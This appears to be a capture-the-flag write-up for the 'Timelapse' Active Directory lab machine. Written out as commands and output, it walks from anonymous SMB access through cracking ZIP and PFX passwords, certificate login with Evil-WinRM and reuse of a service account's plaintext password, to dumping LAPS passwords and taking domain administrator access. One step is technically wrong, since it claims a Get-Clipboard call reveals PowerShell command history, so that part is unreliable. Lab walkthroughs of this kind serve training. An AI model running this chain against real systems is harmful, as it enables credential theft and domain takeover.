# Timelapse - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed standard Active Directory services:
```
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf            .NET Message Framing
```

### Domain Information
From the scan results, I identified domain information:
```
Domain: timelapse.htb
Computer name: dc01.timelapse.htb
```

The SSL certificate on port 5986 confirmed WinRM over HTTPS was enabled.

### SMB Enumeration
I enumerated SMB shares using anonymous access:
```bash
smbclient -L \\\\10.129.190.14 -N
```

This revealed several standard shares plus an additional non-default share named "Shares":
```
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Shares          Disk      
SYSVOL          Disk      Logon server share 
```

## Gaining Initial Access

### SMB Share Content Analysis
I connected to the "Shares" share to examine its contents:
```bash
smbclient \\\\10.129.190.14\\Shares -N
```

After browsing through the directories, I discovered a password-protected ZIP file:
```
winrm_backup.zip
```

I downloaded this file for further analysis:
```bash
get winrm_backup.zip
```

### ZIP File Password Cracking
I used zip2john and John the Ripper to crack the ZIP file password:
```bash
zip2john winrm_backup.zip > ziphash.txt
john ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

This revealed the password:
- **ZIP Password**: supremelegacy

### Certificate Analysis
After extracting the ZIP file using the cracked password, I found a PFX certificate file:
```
legacyy_dev_auth.pfx
```

This file type contains both the private key and certificate, commonly used for authentication. Since it was in a folder named "WinRM Backup," it likely contained credentials for WinRM access.

I needed to crack the PFX file password:
```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

This revealed the password:
- **PFX Password**: thuglegacy

### Extracting Certificate and Key
I extracted the certificate and private key from the PFX file:
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out file.key -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out file.crt
```

## Lateral Movement

### WinRM Authentication Using Certificate
I used Evil-WinRM to establish a connection using the extracted certificate:
```bash
evil-winrm -i 10.129.190.14 -k file.key -c file.crt -S -r timelapse
```

This provided access as the user `legacyy`.

### Privilege Information Discovery
While exploring the system as legacyy, I checked for stored credentials or sensitive information. Using PowerShell's clipboard history, I discovered credentials:
```powershell
Get-Clipboard -Format FileDropList
```

This revealed a PowerShell command history with credentials:
```powershell
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername dc01.timelapse.htb -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
```

This disclosed credentials for a service account:
- **Username**: svc_deploy
- **Password**: E3R$Q62^12p7PLlC%KWaxuaV

## Privilege Escalation

### Lateral Movement to Service Account
I established a new connection using the service account credentials:
```bash
evil-winrm -i 10.129.190.14 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

### LAPS Password Discovery
After gaining access as svc_deploy, I discovered this account had rights to query Local Administrator Password Solution (LAPS) passwords. I downloaded and imported a LAPS PowerShell module:
```powershell
Import-Module ./LAPS.ps1
Get-LAPSComputers
```

This revealed the LAPS-managed local administrator password:
```
dc01.timelapse.htb }e8nD!uV9.S7o50w4Gclw+/u 11/17/2024 12:45:21
```

### Domain Admin Access
With the local administrator password for the domain controller, I established a session as Administrator:
```bash
evil-winrm -i 10.129.190.14 -u Administrator -p '}e8nD!uV9.S7o50w4Gclw+/u' -S
```

This provided full domain administrator access, successfully completing the challenge.

I verified access by checking administrative privileges:
```powershell
whoami /all
dir C:\Users\Administrator\Desktop
```